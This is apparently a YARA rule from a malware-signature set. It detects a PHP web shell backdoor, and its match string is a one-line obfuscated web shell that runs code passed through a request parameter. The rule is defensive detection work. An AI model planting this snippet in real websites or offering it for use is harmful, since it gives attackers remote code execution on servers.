rule WebShell_BackDoor_Unlimit_Webshell_Webshells_New_Xxx_A_1759 {
  meta:
    author = "Spider"
    comment = "None"
    date = "2014/03/28"
    description = "Web shells - generated from file xxx.php"
    family = "Webshell"
    hacker = "None"
    hash = "0e71428fe68b39b70adb6aeedf260ca0"
    judge = "unknown"
    reference = "None"
    score = 70
    threatname = "WebShell[BackDoor]/Unlimit.Webshell.Webshells.New.Xxx.A"
    threattype = "BackDoor"
  strings:
    $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
  condition:
    all of them
}